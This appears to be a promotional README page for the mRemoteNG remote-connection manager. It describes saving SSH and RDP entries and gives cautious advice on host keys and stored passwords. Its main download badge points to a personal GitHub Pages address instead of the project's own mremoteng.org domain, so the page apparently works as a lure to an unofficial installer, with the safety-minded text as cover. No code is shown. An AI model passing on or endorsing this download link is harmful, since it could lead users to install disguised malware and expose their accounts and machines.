# mRemoteNG - Connections to Machines You May Use

mRemoteNG stores connection entries for computers you are allowed to sign in to: your own PC, a server you administer, or a work machine where you were given an account. It does not search the network for hosts, and it does not try passwords. A failed login is a stop, not a puzzle.

---

## Why It Stands Out

![mRemoteNG with one saved connection to a server the user is allowed to use](https://mremoteng.org/app/immutable/assets/lightbox.lqIVIr80.png)

People collect remote desktops and SSH hosts in separate windows and forget which address was real. mRemoteNG keeps those entries in one tree: protocol, host, and user, for machines you already know. The tree is only as trustworthy as the names you typed. A host you guessed does not become yours because it answered.

Check the host key or the certificate warning the first time, and again if it changes without a reason you were told. Store passwords only if this Windows login is yours alone. On a shared PC, type the password when you connect and delete the entry before you hand the computer over. Disconnect when the task is done. An open session is still signed in.

---

## Core Capabilities

- **A Connection You Named:** Protocol, host, and user for a machine you may use.
- **No Discovery:** You type the address. The program does not scan a range.
- **A Host Check:** Stop if the key or certificate does not match what you were given.
- **A Session You Close:** Disconnect so the remote login does not stay open.
- **Passwords Optional:** Leave them unstored when other people can unlock Windows.

---

## Performance Tips

- Add one host you already use, and confirm you reached the machine you expected.
- Do not import a list of addresses you cannot explain.
- Remove stored passwords before this PC goes to someone else.
- If a host key changed, ask the owner before you accept the new one.

---

## System Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| **Operating System** | Windows 10 (64-bit) | Windows 11 (64-bit) |
| **Processor (CPU)** | Dual-core | Any current PC |
| **Memory (RAM)** | 2 GB | 4 GB |
| **Storage** | Small install | Room for the connection file |
| **Network** | A host you are allowed to reach | The published host key |
| **Account** | Yours | No stored password on a shared PC |

---

## Quick Setup

Prerequisites: A host, a username, and a host key or certificate from the person who runs that machine.

[![GET mRemoteNG](https://img.shields.io/badge/GET%20%E2%80%94%20mRemoteNG-166534?style=for-the-badge&logoColor=white)](https://rozellabartos8.github.io/.github/mremoteng-folders)

1.  **Install:** Open the app from the build you chose.
2.  **New Connection:** Enter that one host and user. Do not scan.
3.  **Connect and Read the Warning:** Accept the key only if it matches. Otherwise disconnect.
4.  **Disconnect:** Close the session. Skip saving the password if this Windows account is shared.

---

## Ideal For

- **Your Own Server:** One SSH or RDP entry you use often, with the key checked.
- **A Work Jump Host:** The address IT gave you, and no others.
- **A Laptop You Share:** Connections without stored passwords.
- **A Key Change:** A stop and a question, instead of a click-through.

---

## Troubleshooting

- Connection refused? The host, the port, or the firewall rule is wrong. Do not try other accounts.
- Host key mismatch? Disconnect and ask. Do not accept it to get past the warning.
- Password prompt every time? That is what an unstored password does. Keep it that way on a shared PC.
- You reached the wrong machine? Delete the entry and retype the address from the note you trust.

---

## Find Related Topics

mremoteng connection tree, rdp entry, ssh entry, inheritance off, protocol you know, host key check, one host, no password spray
